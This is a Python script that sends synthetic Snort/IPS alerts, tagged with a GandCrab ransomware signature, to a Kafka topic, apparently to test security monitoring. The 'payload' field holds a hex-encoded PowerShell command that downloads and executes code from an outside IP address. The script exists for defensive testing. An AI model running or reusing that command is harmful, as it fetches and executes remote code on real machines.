#!/usr/bin/env python3
from kafka import KafkaProducer
from faker import Faker
import json
import time
import random
# Configura el productor de Kafka
producer = KafkaProducer(bootstrap_servers=['localhost:9092'],
                        value_serializer=lambda v: json.dumps(v).encode('utf-8'))

# Inicializa Faker para datos sintéticos
fake = Faker()

# Campos a modificar
priority_level = ['high']
address = [
    "162.125.248.18"
]

lan = [ "192.168.0.12" ]
address_malicious = ["88.198.16.134", '46.17.97.37']

# Definición de las firmas para el sig_id y sus revisiones (rev)
sig_ids = [
    (2025452, 1, 'ET TROJAN Observed GandCrab Ransomware Domain (ransomware .bit in DNS Lookup)')
]

# Función para generar direcciones IP realistas
def generate_ip():
    return fake.ipv4_private()  # Genera IPs privadas (puedes cambiar a ipv4_public si necesitas IPs públicas)

# Función para generar eventos sintéticos relacionados con redes
def generate_event():
    sig_id_data = random.choice(sig_ids)
    return {
        "timestamp": int(time.time()),
        "payload": '636d642e657865202f6320706f7765727368656c6c202d6e6f70202d772068696464656e202d632022494558202828286e65772d6f626a656374206e65742e776562636c69656e74292e646f776e6c6f6164737472696e67282768747470733a2f2f34362e31372e39372e33372f5365727665726d61632e70687027292929220a',
        "sensor_id_snort": 0,
        "action": "alert",
        "sig_generator": 1,
        "sig_id": sig_id_data[0],  # ID del evento
        "rev": sig_id_data[1],  # Revisión asociada al evento
        "priority": random.choice(priority_level),
        "classification": "Misc activity",
        "msg": sig_id_data[2],  # Descripción del mensaje
        "l4_proto_name": "udp",
        "l4_proto": 17,
        "ethsrc": "ec:ce:13:ae:32:a3",
        "ethdst": "50:eb:f6:8e:cf:30",
        "ethsrc_vendor": "Cisco Systems, Inc",
        "ethdst_vendor": "ASUSTek COMPUTER INC.",
        "ethtype": 33024,
        "vlan": 30,
        "vlan_name": "30",
        "vlan_priority": 0,
        "vlan_drop": 0,
        "udplength": 72,
        "ethlength": 0,
        "ethlength_range": "0(0-64]",
        "src_port": 48621,
        "src_port_name": "48621",
        "dst_port": 443,
        "dst_port_name": "443",
        "src_asnum": 4110056778,
        "src": random.choice(lan),
        "src_name": random.choice(lan),
        "dst_asnum": "3038642698",
        "dst_name": random.choice(address_malicious),
        "dst": random.choice(address_malicious),
        "ttl": 47,
        "tos": 0,
        "id": 0,
        "iplen": 92,
        "iplen_range": "[64-128)",
        "dgmlen": 92,
        "group_uuid": "f1b4eeb4-12e1-464c-821f-2439564ec585",
        "group_name": "outside",
        "sensor_type": "ips",
        "domain_name": "N/A",
        "sensor_ip": "10.0.250.195",
        "index_partitions": 5,
        "index_replicas": 1,
        "sensor_uuid": "df699ecd-fc05-41fd-a0a3-87ecd7da2245",
        "sensor_name": "rbips-62ac2c7d",
        "namespace": "Namespace Level Alfa",
        "namespace_uuid": "352369f8-60fb-4b72-a603-d1d8393cca0a",
        "organization": "TechSecure",
        "organization_uuid": "4b839195-3d3a-4983-abc0-9731ea731cab",
        "service_provider": "TechSecure Corp",
        "service_provider_uuid": "c2238202-ce42-4235-814f-91d2e6e0122a",
        "campus": "N/A",
        "campus_uuid": "N/A",
        "building": "Main building",
        "building_uuid": "8e004910-c5e7-4ca0-b9df-156b1f6ad0a6"
    }

# Produce mensajes continuamente
message_count = 0

def run_producer(duration):
    start_time = time.time()
    try:
        while duration < 0 or time.time() - start_time < duration:
            data = generate_event()
            producer.send('rb_event', value=data)  # Envía los eventos al topic de Kafka
            print(f'Data sent: {data}')
            time.sleep(1)  # Intervalo entre eventos
    except KeyboardInterrupt:
        pass
    finally:
        producer.close()
if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser()
    parser.add_argument('-d', '--duration', type=int, default=5, help='Duration in seconds (default: 5)')
    args = parser.parse_args()
    run_producer(args.duration)
